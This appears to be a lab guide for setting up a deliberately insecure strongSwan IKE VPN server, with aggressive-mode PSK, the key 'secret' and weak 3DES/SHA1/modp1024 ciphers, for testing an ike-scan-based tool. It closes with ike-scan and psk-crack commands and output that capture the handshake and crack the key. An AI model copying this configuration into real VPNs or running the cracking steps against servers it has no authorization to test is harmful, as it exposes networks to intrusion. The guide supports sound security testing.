# insecure IKE configuration

this document's purpose is to provide a guide on how to setup an **intentionally insecure** VPN server.
this setup can then be used to test the `icke` (`ike-scan`) tool.
it also shows how relatively easy it is to crack weak passwords.

first, follow the guide on [how to set up an IKEv2 VPN server with strongSwan](https://www.digitalocean.com/community/tutorials/how-to-set-up-an-ikev2-vpn-server-with-strongswan-on-ubuntu-22-04) by DigitalOcean.
after that, follow the adjustments, outlined below.

## adjustments

see [IKE Aggressive Mode](https://www.doyler.net/security-not-included/ike-aggressive-mode-vpn).

### edit `/etc/ipsec.secrets`

```text
: RSA "server-key.pem"
: PSK "secret"
```

see [PSK secret](https://wiki.strongswan.org/projects/strongswan/wiki/PskSecret).

### edit `/etc/ipsec.conf`

```text
config setup
  charondebug="ike 1, knl 1, cfg 0"
  uniqueids=no

conn %default
  auto=add

  left=%any
  leftid=%any
  leftcert=server-cert.pem
  leftsendcert=always
  leftsubnet=0.0.0.0/0

  right=%any
  rightsendcert=never
  rightsourceip=10.10.10.0/24

conn ipsec
  aggressive=yes
  authby=psk

  ike=aes256-sha1-modp1024,aes128-sha1-modp1024,3des-sha1-modp1024
  phase2alg=aes256-sha256,aes256-sha1,3des-sha1

conn ikev2-vpn
  ike=chacha20poly1305-sha512-curve25519-prfsha512,aes256gcm16-sha384-prfsha384-ecp384,aes256-sha1-modp1024,aes128-sha1-modp1024,3des-sha1-modp1024
```

see the [man page for `ipsec.conf`](https://linux.die.net/man/5/ipsec.conf).

### edit `/etc/strongswan.conf`

```text
charon {
        load_modular = yes
        plugins {
                include strongswan.d/charon/*.conf
        }
        i_dont_care_about_security_and_use_aggressive_mode_psk = yes
}

include strongswan.d/*.conf
```

see the [documentation about Aggressive Mode in strongSwan](https://docs.strongswan.org/docs/5.9/support/faq.html#_aggressive_mode)

### reload strongSwan

```shell
sudo systemctl restart strongswan-starter.service
```

## exploitation

```text
$ ike-scan --sport=0 --aggressive --id=test --pskcrack=handshake.txt $target
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
[target]  Aggressive Mode Handshake returned HDR=(CKY-R=bb8e1919fe474845) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_DER_ASN1_DN, Decode not supported for this type) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.4: 1 hosts scanned in 0.056 seconds (17.93 hosts/sec).  1 returned handshake; 0 returned notify

$ psk-crack --dictionary=/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt handshake.txt
Starting psk-crack [ike-scan 1.9.4] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "secret" matches SHA1 hash 2b62679eab255edd321d0adf3a9b99cf90a5e321
Ending psk-crack: 90 iterations in 0.001 seconds (85066.16 iterations/sec)
```
